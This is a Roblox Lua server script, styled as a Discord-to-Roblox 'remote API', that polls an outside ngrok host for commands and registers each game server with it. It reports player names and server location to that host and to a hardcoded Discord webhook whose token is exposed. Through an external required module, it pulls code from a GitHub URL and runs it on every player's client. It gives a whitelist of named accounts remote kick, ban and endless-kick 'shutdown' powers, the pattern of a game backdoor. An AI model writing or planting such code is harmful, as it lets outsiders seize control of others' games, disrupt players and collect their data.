--[[Discord to ROBLOX LUA Script
	Made by Vecko/Reloxz/1x3x3x7x1x7
	This script requires a hosted server, and a coded bot to connect and recieve input from
	Below holds the lua side to the magic bridge to have a discord-2-roblox(and)roblox-2-discord bridge/remote :-)
]]



local ok, svc = pcall(function()
	return game:GetService("HttpService")
end)

if not svc.HttpEnabled then
	print('HTTP needs to be enabled!')
	return
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local COMMAND_URL = "https://vecxoremoteapi.ngrok.pro/latest-command"
local REGISTER_URL = "https://vecxoremoteapi.ngrok.pro/register-server"
local REPORT_URL = "https://vecxoremoteapi.ngrok.pro/report-players"
local DataStoreService = game:GetService("DataStoreService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local banDataStore = DataStoreService:GetDataStore("VecxoRemote/PermBans~;;>")
local BANNED_KEY = "PermanentlyBanned"
local banned = {}
local exclusivewll = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973", "Palamode", "Korabi20", "1x3x3x7x1x7", "DeportedImported", "shelbomaster", "gamermeat1", "idonthacklol101ns", "Dawninja21alt"}
local serverId = game.JobId
local serverLabel = "unknown"
local permBanned = {}

local function saveBannedPlayers()
	local success, err = pcall(function()
		banDataStore:SetAsync(BANNED_KEY, permBanned)
	end)
	if success then
		print("Successfully saved banned players to DataStore")
	else
		warn("Failed to save banned players to DataStore:", err)
	end
end

local function isPlayerBanned(playerOrId)
	local playerName
	local userId
	if typeof(playerOrId) == "Instance" and playerOrId:IsA("Player") then
		playerName = playerOrId.Name:lower()
		userId = tostring(playerOrId.UserId)
	else
		userId = tostring(playerOrId)
		playerName = ""
	end
	for _, bannedData in pairs(permBanned) do
		if type(bannedData) == "table" then
			local bannedName = bannedData.name and bannedData.name:lower() or ""
			local bannedId = bannedData.userId and tostring(bannedData.userId) or ""
			if bannedId == userId or (playerName ~= "" and bannedName == playerName) then
				return true, bannedData
			end
		end
	end
	return false
end

local function loadBannedPlayers()
	local success, data = pcall(function()
		return banDataStore:GetAsync(BANNED_KEY)
	end)
	if success and data then
		permBanned = data
		print("Loaded", #permBanned, "permanently banned players from DataStore")
	else
		permBanned = {}
		print("No banned players found in DataStore or failed to load")
	end
end

local function kickBannedPlayer(player, banData)
	local kickMessage = "You are permanently banned from this server.\n" ..
		"Reason: " .. (banData.reason or "No reason provided") .. "\n" ..
		"Banned by: " .. (banData.bannedBy or "System") .. "\n" ..
		"Date: " .. (banData.date or "Unknown")
	player:Kick(kickMessage)
end

task.spawn(function()
	local gameName = "Unknown Game"
	local placeId = game.PlaceId
	local success, gameInfo = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
	end)
	if success and gameInfo and gameInfo.Name then
		gameName = gameInfo.Name
	end
	while true do
		local success, res = pcall(function()
			return HttpService:PostAsync(
				REGISTER_URL,
				HttpService:JSONEncode({ 
					serverId = serverId,
					gameName = gameName,
					placeId = placeId
				}),
				Enum.HttpContentType.ApplicationJson
			)
		end)
		if success then
			local data = HttpService:JSONDecode(res)
			if data and data.label then
				serverLabel = data.label
			end
		end
		task.wait(30)
	end
end)

local function matchesPlayer(p, target)
	local targetLower = target:lower()
	return p.Name:lower():sub(1, #targetLower) == targetLower or p.DisplayName:lower():sub(1, #targetLower) == targetLower
end

local function runCommand(cmd)
	if not cmd or not cmd.text then return end
	local sender = cmd.sender or "Err"
	local text = cmd.text:lower()
	if text:sub(1, 2) == "m " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "FullScreenAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")
				local bg = Instance.new("Frame")
				bg.Size = UDim2.new(1, 0, 1, 0)
				bg.Position = UDim2.new(0, 0, 0, 0)
				bg.BackgroundColor3 = Color3.new(0, 0, 0)
				bg.BackgroundTransparency = 1 
				bg.Parent = gui
				local container = Instance.new("Frame")
				container.Size = UDim2.new(1, -100, 0, 180)
				container.Position = UDim2.new(0.5, 0, 0.5, 0)
				container.AnchorPoint = Vector2.new(0.5, 0.5)
				container.BackgroundTransparency = 1
				container.Parent = bg
				local titleLabel = Instance.new("TextLabel")
				titleLabel.Size = UDim2.new(1, 0, 0, 40)
				titleLabel.Position = UDim2.new(0, 0, 0, 0)
				titleLabel.BackgroundTransparency = 1
				titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				titleLabel.TextStrokeTransparency = 0.4
				titleLabel.Font = Enum.Font.Code
				titleLabel.TextScaled = true
				titleLabel.Text = "[Vecxo Remote API]:"
				titleLabel.Parent = container
				local senderLabel = Instance.new("TextLabel")
				senderLabel.Size = UDim2.new(1, 0, 0, 40)
				senderLabel.Position = UDim2.new(0, 0, 0, 40)
				senderLabel.BackgroundTransparency = 1
				senderLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
				senderLabel.TextStrokeTransparency = 0.6
				senderLabel.Font = Enum.Font.Code
				senderLabel.TextScaled = true
				senderLabel.Text = sender
				senderLabel.Parent = container
				local messageLabel = Instance.new("TextLabel")
				messageLabel.Size = UDim2.new(1, 0, 0, 90)
				messageLabel.Position = UDim2.new(0, 0, 0, 80)
				messageLabel.BackgroundTransparency = 1
				messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				messageLabel.TextStrokeTransparency = 0.4
				messageLabel.Text = ""
				messageLabel.Font = Enum.Font.Code
				messageLabel.TextScaled = true
				messageLabel.TextWrapped = true
				messageLabel.Parent = container
				local tweenService = game:GetService("TweenService")
				local fadeIn = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 0.4 })
				fadeIn:Play()
				fadeIn.Completed:Wait()
				local fullText = msg
				for i = 1, #fullText do
					messageLabel.Text = string.sub(fullText, 1, i)
					task.wait(0.025)
				end
				task.delay(5, function()
					local fadeOutBg = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 1 })
					local fadeOutMessage = tweenService:Create(messageLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutTitle = tweenService:Create(titleLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutSender = tweenService:Create(senderLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					fadeOutBg:Play()
					fadeOutMessage:Play()
					fadeOutTitle:Play()
					fadeOutSender:Play()
					fadeOutBg.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

	if text:sub(1,6) == "whois " then
		local target = text:sub(7):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if p.Name:lower():sub(1, #target) == target then
				local HttpService = game:GetService("HttpService")
				local userId = p.UserId
				local displayName = p.DisplayName
				local accountAge = p.AccountAge
				local isPremium = (p.MembershipType == Enum.MembershipType.Premium)
				local joinTime = os.date("%c", os.time()) -- readable time
				local serverId = (game.JobId ~= "" and game.JobId) or "Public Server"
				local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
				local embed = {
					title = "Whois Lookup",
					description = "**Player:** " .. p.Name .. " (@" .. displayName .. ")\n" ..
						"**UserId:** " .. userId .. "\n" ..
						"**Account Age:** " .. accountAge .. " days\n" ..
						"**Premium:** " .. tostring(isPremium) .. "\n" ..
						"**Server ID:** " .. serverId,
					color = 0x007BFF,
					thumbnail = {
						url = avatarUrl
					},
					fields = {
						{
							name = "Queried At",
							value = joinTime,
							inline = false
						}
					},
					footer = {
						text = "Vecxo Remote API"
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
				local payload = {
					username = "Vecxo Remote API Bot",
					avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
					embeds = {embed}
				}
				local WEBHOOK_URL = "https://discord.com/api/webhooks/1420164939154460783/nM9y9VMCq8T2vfCLDXUJNlzSpOa6_HSacycJsPRywvHg7D-u8cuQ7nSLZhxpTonVFNVX"
				local success, response = pcall(function()
					HttpService:PostAsync(
						WEBHOOK_URL,
						HttpService:JSONEncode(payload),
						Enum.HttpContentType.ApplicationJson
					)
				end)
				if not success then
					warn("Failed to send whois to Discord:", response)
				end
				break
			end
		end
	end

	local TextChatService = game:GetService("TextChatService")
	local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
	local gc = false

	local varName
	local varName2
	local gamegoog

	if gc then
		varName2 = "üè† KAH Module"
		varName = "goog"
		gamegoog = 112691275102014
	else
		varName2 = "üåç Universal Module"
		varName = "Epic"
		gamegoog = 88532011070135
	end

	if text:sub(1, 5) == "chat " then
		local msg = text:sub(6)
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
		end)
		if not success then
			warn'http failed with chat api'
			return
		end
		local formattedMessage = sender .. ": " .. msg
		code = code:gsub('%[Vecko%]: asd', formattedMessage)
		for i, plr in pairs(game.Players:GetPlayers()) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end
			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
	end

	if text:sub(1, 2) == "h " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "RemoteAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")
				local label = Instance.new("TextLabel")
				label.Size = UDim2.new(1, 0, 0, 40)
				label.Position = UDim2.new(0, 0, -0.1, 0)
				label.BackgroundTransparency = 0.3
				label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
				label.TextStrokeTransparency = 0.5
				label.Font = Enum.Font.Ubuntu
				label.TextScaled = true
				label.Text = ""
				label.Parent = gui
				local tweenService = game:GetService("TweenService")
				local tweenIn = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, 0, 0, 0)
				})
				tweenIn:Play()
				tweenIn.Completed:Wait()
				local fullText = "[Vecxo Remote API] - " .. sender .. ": " .. msg
				for i = 1, #fullText do
					label.Text = string.sub(fullText, 1, i)
					task.wait(0.04)
				end
				task.delay(5, function()
					local tweenOut = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
						Position = UDim2.new(0, 0, -0.1, 0)
					})
					tweenOut:Play()
					tweenOut.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

	if text:sub(1, 10) == "unpermban " then
		local target = text:sub(11):lower()
		local unbannedPlayer = nil
		local found = false
		for i = #permBanned, 1, -1 do
			local banData = permBanned[i]
			if banData.name:lower():sub(1, #target) == target or banData.userId == target then
				unbannedPlayer = banData.name
				table.remove(permBanned, i)
				found = true
				break
			end
		end
		if found then
			saveBannedPlayers()
		end
		local embed = {}
		if found then
			embed = {
				title = "‚úÖ Permanent Ban Removed",
				description = "**Player:** " .. unbannedPlayer .. "\n**Server:** " .. (serverLabel or "Server"),
				color = 0x00FF00,
				footer = { text = "Vecxo Remote API Bot" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
		else
			embed = {
				title = "‚ùå PermUnban Failed",
				description = "**Player:** " .. target .. "\n**Reason:** Player not found in permanent ban list\n**Server:** " .. (serverLabel or "Server"),
				color = 0xFF0000,
				footer = { text = "Vecxo Remote API Bot" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
		end
		local payload = {
			username = "Vecxo Remote API Bot",
			avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
			embeds = { embed }
		}
		local WEBHOOK_URL = "https://discord.com/api/webhooks/1420164939154460783/nM9y9VMCq8T2vfCLDXUJNlzSpOa6_HSacycJsPRywvHg7D-u8cuQ7nSLZhxpTonVFNVX"
		pcall(function()
			HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
		end)
	end

	if text:sub(1, 8):lower() == "permban " then
		local args = text:sub(9):split(" ")
		local targetName = args[1]
		local reason = table.concat(args, " ", 2)
		reason = reason ~= "" and reason or "No reason provided"
		local WEBHOOK_URL = "https://discord.com/api/webhooks/1420164939154460783/nM9y9VMCq8T2vfCLDXUJNlzSpOa6_HSacycJsPRywvHg7D-u8cuQ7nSLZhxpTonVFNVX"
		if not targetName or targetName == "" then
			local payload = {
				username = "Vecxo Remote API Bot",
				content = "‚ùå PermBan Failed: No target player specified. Usage: `permban <player> [reason]`"
			}
			pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson) end)
			return
		end
		local targetPlayer, targetUserId = nil, nil
		for _, player in pairs(Players:GetPlayers()) do
			local excluded = false
			for _, exclName in pairs(exclusivewll) do
				if exclName:lower() == player.Name:lower() then
					excluded = true
					break
				end
			end
			if player.Name:lower():sub(1, #targetName:lower()) == targetName:lower() and not excluded then
				targetPlayer = player
				targetUserId = player.UserId
				targetName = player.Name
				break
			end
		end
		if not targetUserId then
			local success, userId = pcall(function()
				return Players:GetUserIdFromNameAsync(targetName)
			end)
			if success then targetUserId = userId end
		end
		for _, bannedData in pairs(permBanned) do
			if bannedData.name:lower() == targetName:lower() or (targetUserId and bannedData.userId == tostring(targetUserId)) then
				local payload = {
					username = "Vecxo Remote API Bot",
					content = "‚ö†Ô∏è Already Permanently Banned: "..targetName
				}
				pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson) end)
				return
			end
		end
		if targetUserId and Players.BanAsync then
			pcall(function()
				Players:BanAsync(targetUserId, reason)
			end)
		end
		local banData = {
			name = targetName,
			userId = targetUserId and tostring(targetUserId) or "Unknown",
			reason = reason,
			bannedBy = sender,
			date = os.date("%Y-%m-%d %H:%M:%S UTC"),
			timestamp = os.time()
		}
		table.insert(permBanned, banData)
		saveBannedPlayers()
		if targetPlayer then
			kickBannedPlayer(targetPlayer, banData)
		end
		local payload = {
			username = "Vecxo Remote API Bot",
			content = string.format(
				"üî® Permban Executed\nPlayer: `%s`\nUserId: `%s`\nReason: %s\nBanned By: `%s`",
				targetName,
				banData.userId,
				reason,
				sender
			)
		}
		pcall(function()
			HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
		end)
	end


	if text:sub(1, 5):lower() == "kick " then
		local args = text:sub(6)
		local targetName, reason = args:match("^(%S+)%s*(.*)")
		reason = reason ~= "" and reason or "No reason provided"
		for _, p in pairs(Players:GetPlayers()) do
			if matchesPlayer(p, targetName:lower()) then
				p:Kick("[Vecxo Remote API] Kicked by "..sender.."\nReason: "..reason)
				break
			end
		end
	end

	if text:sub(1, 4):lower() == "ban " then
		local args = text:sub(5)
		local targetName, reason = args:match("^(%S+)%s*(.*)")
		reason = reason ~= "" and reason or "No reason provided"
		for _, p in pairs(Players:GetPlayers()) do
			if matchesPlayer(p, targetName:lower()) then
				table.insert(banned, p.Name)
				p:Kick("[Vecxo Remote API] Banned by "..sender.."\nReason: "..reason)
				break
			end
		end
	end

	if text:sub(1, 6) == "unban " then
		local target = text:sub(7):lower()
		local unbannedPlayer = nil
		local found = false
		for i = #banned, 1, -1 do
			if banned[i]:lower():sub(1, #target) == target then
				unbannedPlayer = banned[i]
				table.remove(banned, i)
				found = true
				break
			end
		end
		local embed = {}
		if found then
			embed = {
				title = "‚úÖ Player Unbanned",
				description = "**Player:** " .. unbannedPlayer .. "\n**Server:** " .. (serverLabel or "Server"),
				color = 0x00FF00,
				footer = { text = "Vecxo Remote API Bot" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
		else
			embed = {
				title = "‚ùå Unban Failed",
				description = "**Player:** " .. target .. "\n**Reason:** Player not found in ban list\n**Server:** " .. (serverLabel or "Server"),
				color = 0xFF0000, -- Red for error
				footer = { text = "Vecxo Remote API Bot" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
		end

		local payload = {
			username = "Vecxo Remote API Bot",
			avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
			embeds = { embed }
		}

		local WEBHOOK_URL = "https://discord.com/api/webhooks/1420164939154460783/nM9y9VMCq8T2vfCLDXUJNlzSpOa6_HSacycJsPRywvHg7D-u8cuQ7nSLZhxpTonVFNVX"

		local success, err = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send unban feedback to Discord:", err)
		end
	end

	if text:sub(1, 7) == "banlist" then
		local serverBanCount = #banned
		local permBanCount = #permBanned
		local totalBans = serverBanCount + permBanCount

		local description = ""

		description = "**Total Banned Players:** " .. totalBans .. "\n"
		description = description .. "**Server Bans:** " .. serverBanCount .. " | **Permanent Bans:** " .. permBanCount .. "\n\n"

		if totalBans == 0 then
			description = description .. "*No players are currently banned.*"
		else
			if serverBanCount > 0 then
				description = description .. "**üö´ Server Bans (" .. serverBanCount .. ")**\n"
				for i, playerName in pairs(banned) do
					description = description .. "`" .. i .. ".` **" .. playerName .. "**\n" ..
						"‚îî *Server:* " .. (serverLabel or "Server") .. "\n"
				end
				description = description .. "\n"
			end
			if permBanCount > 0 then
				description = description .. "**üîí Permanent Bans (" .. permBanCount .. ")**\n"
				for i, banData in pairs(permBanned) do
					description = description .. "`" .. i .. ".` **" .. banData.name .. "**\n" ..
						"‚îî *Reason:* " .. banData.reason .. "\n" ..
						"‚îî *Date:* " .. banData.date .. "\n\n"
				end
			end

			description = description .. "**Server:** " .. (serverLabel or "Server")
		end

		local embed = {
			title = "üìã Complete Ban List",
			description = description,
			color = 0xFF6600,
			footer = { text = "Vecxo Remote API Bot" },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}

		local payload = {
			username = "Vecxo Remote API Bot",
			avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
			embeds = { embed }
		}

		local WEBHOOK_URL = "https://discord.com/api/webhooks/1420164939154460783/nM9y9VMCq8T2vfCLDXUJNlzSpOa6_HSacycJsPRywvHg7D-u8cuQ7nSLZhxpTonVFNVX"

		local success, err = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send combined banlist to Discord:", err)
		end
	end

	if text:sub(1, 3) == "rj " then
		local target = text:sub(4):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if matchesPlayer(p, target) then
				if game.PrivateServerId ~= "" then
					game:GetService("TeleportService"):Teleport(game.PlaceId, p)
				else
					local options = Instance.new("TeleportOptions")
					options.ServerInstanceId = game.JobId
					game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {p}, options)
				end
			end
		end
	end

	if text:sub(1, 8) == "shutdown" then
		while true do wait(1)
			for _, p in pairs(Players:GetPlayers()) do
				p:Kick("[Vecxo Remote API]: - Shutdown by "..sender)
			end
		end
	end
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	local playerGui = player:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoHintGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui


	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 300, 0, 80)
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Position = UDim2.new(1, -20, 1, -20)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BackgroundTransparency = 0.8
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.ClipsDescendants = true
	frame.AutomaticSize = Enum.AutomaticSize.Y


	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -20, 0, 30)
	titleLabel.Position = UDim2.new(0, 10, 0, 10)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, -20, 0, 40)
	messageLabel.Position = UDim2.new(0, 10, 0, 40)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextSize = 16
	messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
	messageLabel.TextWrapped = true
	messageLabel.TextXAlignment = Enum.TextXAlignment.Left
	messageLabel.TextYAlignment = Enum.TextYAlignment.Top
	messageLabel.Parent = frame

	frame.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	messageLabel.TextTransparency = 1

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInGoals = {
		BackgroundTransparency = 0.8,
	}
	local fadeInTitleGoals = {
		TextTransparency = 0,
	}
	local fadeInMessageGoals = {
		TextTransparency = 0,
	}

	local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
	local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
	local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)

	fadeInTween:Play()
	fadeInTitleTween:Play()
	fadeInMessageTween:Play()

	fadeInTween.Completed:Wait()

	task.wait(4)

	local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
	local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
	local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

	fadeOutTween:Play()
	fadeOutTitleTween:Play()
	fadeOutMessageTween:Play()
	fadeOutTween.Completed:Wait()
	screenGui:Destroy()
end



Players.PlayerAdded:Connect(function(player)
	local isBanned, banData = isPlayerBanned(player)
	if isBanned then
		kickBannedPlayer(player, banData)
	end
	if table.find(banned, player.Name) then
		player:Kick("[Vecxo Remote API]: - You were remotely banned from the server.")
	end
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local DEBOUNCE_DELAY = 45
local debounceThread = nil

local function sendRequestNow()
	local playerNames = {}
	task.wait(0.5)
	for _, player in ipairs(Players:GetPlayers()) do
		table.insert(playerNames, player.Name)
	end

	local success, err = pcall(function()
		HttpService:PostAsync(
			REPORT_URL,
			HttpService:JSONEncode({
				serverId = serverId,
				players = playerNames
			}),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[Vecxo Remote API] Failed to auto-report players:", err)
		task.wait(10)
	end
end

local function debounceReport()
	if debounceThread then
		task.cancel(debounceThread)
	end
	debounceThread = task.delay(DEBOUNCE_DELAY, sendRequestNow)
end

task.spawn(sendRequestNow)

Players.PlayerAdded:Connect(debounceReport)
Players.PlayerRemoving:Connect(debounceReport)

local HttpService = game:GetService("HttpService")

local FAST_POLL = 1
local SLOW_POLL = 3
local IDLE_THRESHOLD = 30

local interval = FAST_POLL
local lastActiveTime = 0
local lastCommandHash = nil

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1420164939154460783/nM9y9VMCq8T2vfCLDXUJNlzSpOa6_HSacycJsPRywvHg7D-u8cuQ7nSLZhxpTonVFNVX"

local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function sendPollingStatusEmbed(serverId, senderName, command)
	local color = 0x00FF00
	local title = "üì• Command Received"

	local description = string.format(
		"üñ•Ô∏è **Server ID:** `%s`\nüë§ **Sender:** `%s`\nüí¨ **Command received:** ```%s```",
		tostring(serverId),
		sanitizeMessage(senderName),
		sanitizeMessage(command)
	)

	local footerText = "üì° Monitoring active"

	local embed = {
		title = title,
		description = description,
		color = color,
		footer = {
			text = footerText
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}

	local payload = {
		username = "Vecxo Remote API Bot",
		avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
		embeds = { embed }
	}

	local success, response = pcall(function()
		return HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode(payload),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[Discord Webhook Error]:", response)
	end
end



task.spawn(function()
	while true do
		task.wait(interval)
		local success, response = pcall(function()
			local url = COMMAND_URL .. "?serverId=" .. HttpService:UrlEncode(serverId)
			return HttpService:GetAsync(url)
		end)
		if success then
			local data = HttpService:JSONDecode(response)
			if data and data.command then
				local commandHash = HttpService:GenerateGUID(false)
				if commandHash ~= lastCommandHash then
					runCommand(data.command)
					lastCommandHash = commandHash
					lastActiveTime = tick()
					sendPollingStatusEmbed(game.JobId, "System", data.command)
					if interval ~= FAST_POLL then
						interval = FAST_POLL
					end
				end
			end
		else
			for _, v in pairs(Players:GetPlayers()) do
				if table.find(exclusivewll, v.Name) then
					notifyv2(v, "[Vecxo]: ", "‚ö†Ô∏è Inactivity detected, Command fetch failed: " .. tostring(response))
				end
			end
			if interval ~= SLOW_POLL then
				interval = SLOW_POLL
			end
		end
		if (tick() - lastActiveTime) > IDLE_THRESHOLD then
			if interval ~= SLOW_POLL then
				interval = SLOW_POLL
				sendPollingStatusEmbed(game.JobId, "System", "üí§ Idle mode")
			end
		end
	end
end)
local cachedRegion, cachedCountry = "Unknown", "Unknown"
local locationFetched = false
local serverStartTime = tick()
local function getServerLocation(timeout)
	timeout = timeout or 10
	if locationFetched then
		return cachedRegion, cachedCountry
	end
	local startTime = tick()
	local success, data = pcall(function()
		local response = HttpService:GetAsync("http://ip-api.com/json/")
		return HttpService:JSONDecode(response)
	end)
	if success and data and data.country and data.regionName then
		cachedCountry = data.country
		cachedRegion = data.regionName
		locationFetched = true
	elseif (tick() - startTime) > timeout then
		warn("[Vecxo]: Location fetch timed out.")
	end
	return cachedRegion, cachedCountry
end
local function sendServerStatusEmbed(status, serverId, playerCount)
	local region, country = getServerLocation()
	local MarketplaceService = game:GetService("MarketplaceService")
	local isConnect = (status == "connect")
	local color = isConnect and 0x00FF00 or 0xFF0000
	local title = isConnect and "‚úÖ Server Connected" or "üõë Server Closed"
	local gameName = "Unknown Game"
	local successGameInfo, result = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	if successGameInfo and result and result.Name then
		gameName = result.Name
	end
	local uptime = ""
	if not isConnect then
		local duration = tick() - serverStartTime
		local minutes = math.floor(duration / 60)
		local seconds = math.floor(duration % 60)
		uptime = string.format("\n‚è≥ Uptime: **%dm %ds**", minutes, seconds)
	end
	local description = string.format(
		"%s\n\nüéÆ Game: **%s**\nüë• Player Count: **%d**\nüÜî Server ID: `%s`\nüìç Server Location: **%s, %s**%s",
		isConnect and "A new server has successfully connected." or "The server has been closed.",
		gameName, playerCount, serverId, region, country, uptime
	)
	local embed = {
		title = title,
		description = description,
		color = color,
		footer = { text = "Vecxo Remote API Bot" },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}
	local payload = {
		username = "Vecxo Remote API Bot",
		avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
		embeds = { embed }
	}
	local success, response = pcall(function()
		return HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode(payload),
			Enum.HttpContentType.ApplicationJson
		)
	end)
	if not success then
		warn("[Discord Webhook Error]:", response)
	end
end
sendServerStatusEmbed("connect", game.JobId, #Players:GetPlayers())
game:BindToClose(function()
	sendServerStatusEmbed("close", game.JobId, #Players:GetPlayers())
end)
loadBannedPlayers()
for i, v in pairs(Players:GetPlayers()) do
	if table.find(exclusivewll, v.Name) then
		task.wait(5)
		notifyv2(v, "[Vecxo]:", "‚úÖ Remote API Successfully connected")
	end
end
Players.PlayerAdded:connect(function(plr)
	if table.find(exclusivewll, plr.Name) then
		task.wait(5)
		notifyv2(plr, "[Vecxo]: ", "‚úÖ Remote API Successfully connected")
	end
end)
